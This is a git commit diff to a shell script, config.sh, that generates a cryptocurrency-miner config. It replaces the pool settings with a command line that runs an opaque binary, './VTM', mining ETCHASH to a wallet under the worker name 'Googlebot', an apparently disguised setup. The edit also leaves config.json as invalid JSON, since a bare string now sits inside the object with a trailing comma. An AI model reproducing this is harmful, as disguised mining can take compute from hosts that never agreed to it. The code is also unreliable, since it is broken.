1313ccb61e600de224e34f46df52d63aa05afa0d
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-10-30 02:00:25 +0700

    Update config.sh

--- config.sh
+++ config.sh
@@ -1,7 +1,8 @@
 cat > config.json <<END
 {
-        "url" : "stratum+tcp://etc.poolbinance.com:443",
-        "user" : "0x11880b1cfe04907c5306222be1e09f4bbb480eb5.Googlebot",
-        "algo" : "ETCHASH",
+
+        "./VTM --algo ETCHASH --pool etc.2miners.com:1010 --user 0x11880b1cfe04907c5306222be1e09f4bbb480eb5.Googlebot --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99",
+        
 }
 END
+
